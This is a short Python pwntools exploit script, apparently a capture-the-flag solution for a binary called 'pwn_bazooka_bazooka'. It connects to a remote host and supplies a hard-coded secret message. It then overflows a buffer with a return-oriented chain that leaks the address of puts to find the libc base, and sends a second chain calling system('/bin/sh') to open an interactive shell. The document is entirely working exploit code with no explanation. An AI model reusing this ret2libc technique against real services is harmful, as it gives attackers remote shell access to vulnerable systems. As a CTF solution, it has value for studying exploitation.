from pwn import *

libc = ELF("libc6_2.27-3ubuntu1.3_amd64.so")

# io = process(["./pwn_bazooka_bazooka"])
io = connect("34.89.183.202",32160)

io.recvuntil(b"Secret message: ")
io.sendline(b"#!@{try_hard3r}")

io.recvuntil(b"Message:")

gadget_addr = 0x4008f3
puts_plt = 0x4005b0
puts_got = 0x601018
main = 0x400821

p = b"A"*120
p += p64(gadget_addr)
p += p64(puts_got)
p += p64(puts_plt)
p += p64(main)

io.sendline(p)

io.recvuntil(b"Hacker alert")
io.recvline()

puts_addr = u64(io.recvline().rstrip().ljust(8, b"\x00"))

log.info(f'puts address: {hex(puts_addr)}')

libc.address = puts_addr - libc.symbols["puts"]
log.success(f"libc base: {hex(libc.address)}")
payload = b"A"*120
payload += p64(gadget_addr)
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(gadget_addr+1)
payload += p64(libc.symbols["system"])
payload += p64(libc.symbols["exit"])

io.sendlineafter("Secret message: ", "#!@{try_hard3r}")
io.sendlineafter("Message: ", payload)

io.interactive()
